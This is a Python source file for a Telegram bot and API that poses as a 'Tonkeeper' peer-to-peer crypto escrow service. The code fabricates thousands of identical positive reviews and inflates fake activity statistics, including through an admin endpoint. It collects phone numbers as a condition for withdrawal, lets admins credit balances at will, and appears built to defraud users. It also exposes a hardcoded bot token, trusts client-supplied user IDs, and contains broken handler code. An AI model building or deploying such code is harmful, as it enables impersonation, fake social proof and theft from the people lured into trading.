import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
SUPPORT_LINK = "@p2psupbot"
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = " Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])

# ============================================================
# 4. ГЕНЕРАЦИЯ СТАТИСТИКИ (ПЛАВНАЯ)
# ============================================================
def init_stats():
    if not stats:
        stats["deals_today"] = 23
        stats["users"] = 1250
        stats["reviews"] = 5234
        stats["volume"] = 45.6
        stats["online"] = 6500
        save_json(FILES["stats"], stats)
    return stats

init_stats()

def get_stats():
    # Плавное увеличение (не резкое)
    stats["deals_today"] += random.choice([0, 0, 1, 0, 0, 1, 0, 0, 0, 1])
    stats["users"] += random.choice([0, 0, 0, 1, 0, 0, 0, 1, 0, 0])
    stats["reviews"] += random.choice([0, 0, 0, 0, 1, 0, 0, 0, 0, 1])
    stats["volume"] += round(random.choice([0, 0, 0.1, 0, 0, 0.2, 0, 0, 0, 0.1]), 1)
    stats["online"] = random.randint(6200, 6800)
    save_json(FILES["stats"], stats)
    return stats

# ============================================================
# 5. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int, phone: str):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "phone": phone
    }
    save_json(FILES["verification"], verification_data)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

# ============================================================
# 6. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)

generate_reviews()

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance")],
        [InlineKeyboardButton(text="📊 Мои сделки", callback_data="menu_deals")],
        [InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews")],
        [InlineKeyboardButton(text="📢 Канал", callback_data="menu_channel")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="menu_support")],
        [InlineKeyboardButton(text="🌐 Сменить язык", callback_data="select_language")]
    ] + ([InlineKeyboardButton(text="👑 Админ панель", callback_data="menu_admin")] if is_admin(user_id) else []))

def admin_panel_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text="💰 Начислить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="👥 Управление админами", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text="⭐️ Управление отзывами", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
        [InlineKeyboardButton(text="🇨🇳 中文", callback_data="set_lang_zh")],
        [InlineKeyboardButton(text="🇸🇦 العربية", callback_data="set_lang_ar")]
    ])

def back_to_main_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

# ============================================================
# 8. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            "🌐 Выберите язык / Choose language",
            reply_markup=language_keyboard()
        )
        return
    
    await message.answer(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "🔹 Честные сделки\n"
        "🔹 TON | STARS | RUB | UAH\n"
        "🔹 Гарант безопасности\n"
        "🔹 Премиум поддержка 24/7\n\n"
        f"📢 Канал: {CHANNEL_LINK}\n"
        f"🆘 Поддержка: {SUPPORT_LINK}\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("✅ Язык установлен")
    await cmd_start(callback.message)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🌐 Выберите язык / Choose language",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\nВыберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"📢 Наш канал\n\n{CHANNEL_LINK}\n\n"
        "В канале:\n• Новости и обновления\n• Полезные гайды\n• Розыгрыши и бонусы\n• Актуальные курсы",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_support")
async def menu_support(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🆘 Поддержка\n\n{SUPPORT_LINK}\n\n"
        "📢 Наш канал: " + CHANNEL_LINK,
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    bal = get_balance(callback.from_user.id)
    text = f"""💰 <b>Ваш баланс</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    if not user_deals:
        await callback.message.edit_text("📭 У вас нет сделок", reply_markup=back_to_main_keyboard(callback.from_user.id))
        return
    text = "📊 <b>Ваши сделки</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    reviews_list = list(reviews.values())
    if not reviews_list:
        text = "⭐️ <b>Отзывы</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>Отзывы</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n\n"
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 9. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ (ВЕДЁТ В MINI APP)
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ Сделка уже завершена")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ Доступ запрещён!\n\nЭта сделка для @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    # Отправляем ссылку на Mini App с параметром сделки
    await message.answer(
        f"✈️ <b>Сделка #{deal_id}</b>\n\n"
        f"📦 {deal['product']}\n"
        f"💰 {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"🔥 Перейдите в Mini App для оплаты:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=f"{MINI_APP_URL}?deal={deal_id}"))],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )

# ============================================================
# 10. ВЫВОД СРЕДСТВ (С ПРОВЕРКОЙ)
# ============================================================
@dp.callback_query(lambda c: c.data == "withdraw_start")
async def withdraw_start(callback: types.CallbackQuery):
    bal = get_balance(callback.from_user.id)
    partners = bal.get("deal_partners", {})
    total_deals = sum(partners.values())
    
    # Проверка: нужно 2 сделки с одним покупателем
    can_withdraw = any(count >= 2 for count in partners.values())
    
    if not can_withdraw:
        await callback.message.edit_text(
            f"⚠️ <b>Для вывода необходимо 2 сделки с одним покупателем!</b>\n\n"
            f"У вас: {total_deals} сделок с {len(partners)} покупателями.\n\n"
            f"Создайте и завершите ещё сделки.",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        return
    
    # Проверка верификации
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            f"⚠️ <b>Для вывода средств необходима верификация!</b>\n\n"
            f"Введите ваш номер телефона в формате:\n"
            f"<code>+79001234567</code>\n\n"
            f"После проверки вам будет доступен вывод.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📱 Отправить номер", callback_data="send_phone")],
                [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
            ])
        )
        return
    
    # Всё ок — выводим
    await callback.message.edit_text(
        f"💲 <b>Вывод средств</b>\n\n"
        f"Напишите админу в личные сообщения:\n"
        f"{SUPPORT_LINK}\n\n"
        f"Укажите сумму и реквизиты.",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "send_phone")
async def send_phone(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        f"📱 Введите ваш номер телефона в формате:\n"
        f"<code>+79001234567</code>\n\n"
        f"Это необходимо для верификации.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await state.set_state("waiting_phone")
    await callback.answer()

@dp.message(lambda msg: msg.text and msg.text.startswith("+") and len(msg.text) >= 11)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = str(message.from_user.id)
    
    # Сохраняем верификацию
    complete_verification(message.from_user.id, phone)
    add_log("verification", {"user_id": message.from_user.id, "phone": phone})
    
    await message.answer(
        f"✅ <b>Верификация пройдена!</b>\n\n"
        f"📱 Номер: {phone}\n"
        f"🕐 Сессия активна 24 часа.\n\n"
        f"💰 Теперь вам доступен вывод средств.",
        reply_markup=back_to_main_keyboard(message.from_user.id)
    )
    await state.clear()

@dp.message(lambda msg: state := None)
async def invalid_phone(message: types.Message):
    await message.answer(
        "❌ Неверный формат номера!\n\n"
        "Используйте: <code>+79001234567</code>"
    )

# ============================================================
# 11. АДМИН ПАНЕЛЬ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text(
        "👑 <b>Админ панель</b>\n\nВыберите действие:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "📊 <b>Все сделки</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "💲 <b>Заявки на вывод</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text("💰 <b>Начислить баланс</b>\n\nВведите Telegram ID пользователя:")
    await state.set_state("waiting_user_id")
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer("💱 Введите сумму валюту (TON/STARS/RUB/UAH):")
        await state.set_state("waiting_currency")
    except:
        await message.answer("❌ Введите корректный ID")

# ... остальные админ-обработчики

# ============================================================
# 12. API ДЛЯ MINI APP
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    endpoint = request.path
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({'success': True, 'balance': get_balance(user_id)}, headers=headers)
    
    # ===== СТАТИСТИКА (ПЛАВНАЯ) =====
    elif endpoint == '/api/stats':
        stats_data = get_stats()
        return web.json_response({
            'success': True,
            'deals_today': stats_data.get('deals_today', 0),
            'users': stats_data.get('users', 0),
            'reviews': stats_data.get('reviews', 0),
            'volume': stats_data.get('volume', 0)
        }, headers=headers)
    
    # ===== ОНЛАЙН =====
    elif endpoint == '/api/online':
        return web.json_response({'online': random.randint(6200, 6800)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ПРОВЕРКА ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/check_verification':
        return web.json_response({'success': True, 'verified': is_verified(user_id)}, headers=headers)
    
    # ===== ПРОВЕРКА СДЕЛОК ДЛЯ ВЫВОДА =====
    elif endpoint == '/api/can_withdraw':
        bal = get_balance(user_id)
        partners = bal.get("deal_partners", {})
        can_withdraw = any(count >= 2 for count in partners.values())
        return web.json_response({
            'success': True,
            'can_withdraw': can_withdraw,
            'deals': sum(partners.values()),
            'partners': len(partners)
        }, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        add_log("api_create_deal", {"deal_id": deal_id, "user_id": user_id, "amount": amount})
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОПЛАТА С БАЛАНСА =====
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        # Проверяем баланс покупателя
        buyer_balance = get_balance(user_id)
        curr_key = deal["currency"].lower()
        if buyer_balance.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        # Списываем
        buyer_balance[curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        add_log("pay_balance", {"deal_id": deal_id, "user_id": user_id, "amount": deal["amount"], "currency": deal["currency"]})
        
        # Уведомляем продавца
        try:
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                f"⬇️ Передайте товар",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="📦 Передал товар", callback_data=f"seller_done_{deal_id}")]
                ])
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        return web.json_response({
            'success': True,
            'details': f"Оплатите {deal['amount']} {deal['currency']} и нажмите «Я оплатил»"
        }, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ РЕКВИЗИТЫ (АДМИН) =====
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        add_log("rekvisits_paid", {"deal_id": deal_id, "admin": user_id})
        
        # Уведомляем продавца
        try:
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                f"⬇️ Передайте товар",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="📦 Передал товар", callback_data=f"seller_done_{deal_id}")]
                ])
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Not paid'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        add_log("seller_delivered", {"deal_id": deal_id})
        
        # Уведомляем покупателя
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"📦 <b>Продавец передал товар по сделке #{deal_id}</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Продавец: @{deal['seller_username']}\n\n"
                f"⬇️ Подтвердите получение",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Подтвердить получение", callback_data=f"buyer_confirm_{deal_id}")]
                ])
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Wrong status'}, headers=headers)
        
        # Зачисляем продавцу
        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
        
        # Обновляем партнёров
        seller_balance = get_balance(deal["seller_id"])
        buyer = deal["buyer_username"]
        if buyer not in seller_balance["deal_partners"]:
            seller_balance["deal_partners"][buyer] = 0
        seller_balance["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        add_log("deal_completed", {"deal_id": deal_id})
        
        # Уведомляем продавца
        try:
            await bot.send_message(
                deal["seller_id"],
                f"🎉 <b>Сделка #{deal_id} завершена!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']} зачислены на ваш баланс"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== НАКРУТКА СТАТИСТИКИ =====
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        key = data.get('key')
        value = data.get('value')
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
        stats[key] = value
        save_json(FILES["stats"], stats)
        add_log("admin_set_stats", {"key": key, "value": value})
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 13. ЗАПУСК ВЕБ-СЕРВЕРА
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

# ============================================================
# 14. ЗАПУСК
# ============================================================
async def main():
    print("=" * 50)
    print("🔥 Tonkeeper P2P Бот + API")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
